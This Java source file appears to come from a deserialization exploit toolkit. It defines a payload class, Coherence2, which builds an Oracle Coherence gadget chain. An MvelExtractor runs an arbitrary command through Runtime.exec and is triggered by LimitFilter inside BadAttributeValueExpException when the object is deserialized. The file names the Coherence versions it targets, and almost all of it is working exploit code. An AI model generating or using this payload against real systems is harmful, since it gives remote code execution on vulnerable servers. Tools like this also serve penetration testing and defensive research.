package com.ppp.chain.coherence;

import com.ppp.KickOff;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.tangosol.coherence.rest.util.extractor.MvelExtractor;
import com.tangosol.util.filter.LimitFilter;

import java.lang.reflect.Field;

/*
 * gadget:
 *      BadAttributeValueExpException.readObject()
 *          com.tangosol.util.filter.LimitFilter.toString()
 *              com.tangosol.coherence.rest.util.extractor.MvelExtractor;
 */
@Dependencies({"coherence:3.7.1.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0"})
@Authors({Authors.CCKUAILONG})
@Sink({Sink.Default})
public class Coherence2 implements ObjectPayload<Object> {
    public static void main(String[] args) throws Exception {
        PayloadRunner.run(Coherence2.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain((String) sinkObject);

        return kickOffObject;
    }

    public Object getChain(String command) throws Exception {
        MvelExtractor mvelExtractor = new MvelExtractor("java.lang.Runtime.getRuntime().exec(\""+command+"\")");

        LimitFilter limitFilter = new LimitFilter();
        limitFilter.setTopAnchor(Runtime.class);
        Field m_comparator = limitFilter.getClass().getDeclaredField("m_comparator");
        m_comparator.setAccessible(true);
        m_comparator.set(limitFilter, mvelExtractor);
        Field m_oAnchorTop = limitFilter.getClass().getDeclaredField("m_oAnchorTop");
        m_oAnchorTop.setAccessible(true);
        m_oAnchorTop.set(limitFilter, Runtime.class);

        return KickOff.badAttributeValueExpException(limitFilter);
    }
}